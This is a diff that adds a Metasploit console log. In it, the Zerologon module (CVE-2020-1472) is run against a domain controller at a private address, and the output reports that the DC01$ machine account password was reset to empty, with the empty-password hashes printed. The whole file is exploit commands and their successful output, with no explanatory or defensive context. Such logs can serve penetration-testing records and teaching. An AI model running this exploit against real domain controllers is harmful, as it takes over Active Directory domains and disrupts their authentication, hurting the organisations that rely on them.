@@ -1,0 +1,9 @@
+msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
+[*] Running module against 192.168.0.10
+[*] 192.168.0.10: - Connecting to the endpoint mapper service...
+[*] 192.168.0.10: - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.0.10[49155] ...
+[*] 192.168.0.10: - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.0.10[49155] ...
+[+] 192.168.0.10: - Successfully authenticated
+[+] 192.168.0.10: - Successfully set the machine account (DC01$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > 
